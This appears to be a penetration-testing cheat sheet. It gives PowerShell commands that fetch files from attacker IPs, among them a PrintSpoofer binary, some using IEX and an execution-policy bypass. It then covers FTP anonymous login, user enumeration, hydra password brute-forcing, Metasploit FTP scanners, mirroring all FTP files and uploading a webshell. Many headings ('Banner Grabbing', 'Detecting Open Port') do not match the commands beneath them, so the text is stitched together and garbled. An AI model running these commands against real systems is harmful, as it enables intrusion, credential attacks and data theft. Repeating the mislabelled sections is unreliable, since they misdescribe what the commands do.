USING POWERSHELL - 
------------------------------------------------------------------------------------------------------------------


#### Detecting Open Port
	
     powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/demo.txt','c:\demo.txt')

**Nmap Scripts**

       powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://192.168.1.143/1.txt' -Destination 'c:\temp\1.txt'"

**Banner Grabbing**
	
        $webClient.DownloadFile('http://192.168.1.143:80/1.txt','c:\temp\1.txt')

**Banner Grabbing**
	
        iwr -uri http://192.168.45.240/printspoofer.exe -Outfile printspoofer.exe

**Banner Grabbing**
	
        powershell.exe IEX(New-Object System.Net.WebClient).downloadFile('http://192.168.1.143:80/1.txt','C:\Users\public\1.txt')

**Banner Grabbing**
	
        powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://192.168.1.143/1.txt','C:\temp\1.txt')"

**Banner Grabbing**
	
        echo IEX(New-Object System.Net.WebClient).downloadFile('http://192.168.1.143:80/1.txt','C:\Users\public\1.txt') | powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile

**Banner Grabbing**
	
        powershell.exe -c wget "http://10.10.14.17/1.txt" -outfile "c:\temp\1.txt"

**Banner Grabbing**
	
        powershell.exe -c "curl.exe http://192.168.1.143:80/1.txt c:\temp\1.txt"	

**Banner Grabbing**
	
        powershell.exe Invoke-RestMethod -Uri "http://192.168.1.143/1.txt" -OutFile "c:\temp\1.txt"

**Banner Grabbing**
	
        powershell.exe Invoke-webRequest -Uri "http://192.168.1.143/1.txt" -OutFile "c:\temp\1.txt"















 
#### Anonymous Authentication manually
````
      iwr -uri http://192.168.45.240/printspoofer.exe -Outfile printspoofer.exe
````
#provide anonymous as username

#provide any passowrd
	
## FTP client commands

  
    Command 								    	          Description

	bye or close or quit						            Terminates an FTP connection.

	cd 							                            Changes the current working directory on the FTP host server.

	cwd									            Changes the current directory to the specified remote directory.

	dir							                            Requests a directory of files uploaded or available for download.
	
	get				                                                    Downloads a single file.

	ls										    Requests a list of file names uploaded or available for download.

	mget								            Interactively downloads multiple files.

	mput								            Interactively uploads multiple files.

	put								                    Uploads a single file.

	pwd									            Queries the current working directory.

	ren									            Renames or moves a file.
 
	site						                                   Executes a site-specific command.
	
	open									   Starts an FTP connection.

	pasv										    Tells the server to enter passive mode, in which the server waits for the client to establish a connection rather than attempting to connect to a port the client specifies.

#### Ftp User enumeration with github script

`````	
     https://raw.githubusercontent.com/pentestmonkey/ftp-user-enum/master/ftp-user-enum.pl
`````
         ftp-user-enum.pl -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $ip
`````	
     ftp-user-enum.pl -M iu -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $ip
`````
### Brute Forcing with hydra

	     hydra -l ftp -P password.txt ftp://$ip 
	
	     hydra -L username.txt -P password.txt ftp://$ip
	
## Metasploit Modules for FTP service

#### 1. auxiliary/scanner/ftp/anonymous
 #### 2. auxiliary/scanner/ftp/ftp_version
#### 3. auxiliary/scanner/ftp/ftp_login
#### 4. auxiliary/scanner/ftp/konica_ftp_traversal

	$  msfconsole
	
      1.Metasploit auxilliary for ftp anonymous check :

      msf6 > use auxiliary/scanner/ftp/anonymous

      msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS $ip

      msf6 auxiliary(scanner/ftp/anonymous) > run
      
  **Download All File from FTP**
    
        wget -m ftp://anonymous:anonymous@$ip
    
        wget -m --no-passive ftp://anonymous:anonymous@$ip
    
   **Uploading a binary or webshell**
      
         ftp> binary
         ftp> put file/name
      
   **Reference**
	
    	https://raw.githubusercontent.com/pentestmonkey/ftp-user-enum/master/ftp-user-enum.pl
